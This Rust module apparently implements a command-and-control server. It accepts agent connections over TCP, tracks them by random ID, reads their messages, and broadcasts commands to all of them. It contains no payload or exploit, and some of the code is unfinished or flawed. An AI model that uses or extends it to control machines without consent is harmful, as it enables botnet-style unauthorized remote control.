use tokio::net::{TcpListener};
use tokio::io::Interest;
use std::io;
use tokio::sync::Mutex;
use std::sync::Arc;
use std::collections::HashMap;

use rand::prelude::*;

use crate::socket::{SocketState, SocketStream};
pub struct Server {
    pub streams: Arc<Mutex<HashMap<i32, SocketStream>>> // or agents
}

impl Server {
    pub fn new() -> Self {
        Self {
            streams: Arc::new(Mutex::new(HashMap::new()))
        }
    }

    pub async fn assign_new_socket(&mut self, socket: SocketStream) {
        let streams = Arc::clone(&self.streams);
        let mut streams_lock = streams.lock().await;
        
        let new_socket_id = generate_random_num();
        streams_lock.insert(new_socket_id, socket);
        self.read_new_socket(new_socket_id).await.unwrap();
    }

    pub async fn broadcast_command(&mut self, command: Vec<u8>) -> Result<(), Vec<&SocketStream>> {
        let mut failed_broadcasts: Vec<&SocketStream> = Vec::new();
        let streams = Arc::clone(&self.streams);
        let mut streams = streams.lock().await;
        for stream in &mut *streams {
            let res = stream.1.write_msg(&command).await;
            if res.is_err() {
                // failed_broadcasts.push(&stream);
                continue
            }
        }

        if failed_broadcasts.len() > 0 {Err(failed_broadcasts)} else {Ok(())}
    }

    pub async fn read_new_socket(&mut self, id: i32) -> io::Result<()> {
        // A loop which reads messages from the CnC
        // server.assign_new_stream(stream: SocketStream)
        let my_streams = Arc::clone(&self.streams);
        tokio::spawn(async move {
            loop {
                let streams = my_streams.lock().await;
                let socket = streams.get(&id).unwrap();
                let stream_ready = socket.stream.ready(Interest::READABLE | Interest::WRITABLE).await.unwrap();
        
                if stream_ready.is_readable() {
                    
                    let msg = socket.consume_message().await;
                    
                    match msg {
                        Err(e) if e.kind() == std::io::ErrorKind::ConnectionReset => {
                            println!("Agent disconnected");
                            break
                        },
                        Ok((msg, n_bytes)) => {
                            if n_bytes == 0 {
                                println!("Disconnected!");
                                break
                            }
                            
                            socket.handle_msg(msg).await;
                        },
                        _ => {}
                    }
                }
            }
        });
    
        Ok(())
    }
}



pub async fn start_cnc_server(ip: &str, port: u16, server: &mut Server) -> io::Result<()> {
    let listener = TcpListener::bind(&format!("{}:{}", ip, port)).await?;
    loop {
        let (socket, _) = listener.accept().await?;
        let socket = SocketStream::new(socket);
        server.assign_new_socket(socket).await;
    }
}

pub fn generate_random_num() -> i32 {
    let mut rng = rand::thread_rng();
    let y: f64 = rng.gen(); // generates a float between 0 and 1
    
    let mut nums: Vec<i32> = (1..5454).collect();
    nums.shuffle(&mut rng);
    *nums.get(0).unwrap()
}